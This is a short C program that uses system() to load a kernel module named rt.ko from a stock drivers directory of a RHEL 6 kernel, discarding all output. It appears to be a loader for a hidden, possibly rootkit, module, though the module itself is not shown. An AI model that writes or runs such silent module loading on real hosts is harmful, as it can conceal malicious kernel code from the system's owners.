#include <stdlib.h>

int main()
{
	system("insmod /lib/modules/2.6.32-220.el6.x86_64/kernel/drivers/md/rt.ko 1>/dev/null 2>/dev/null");
	
	return 0;
}
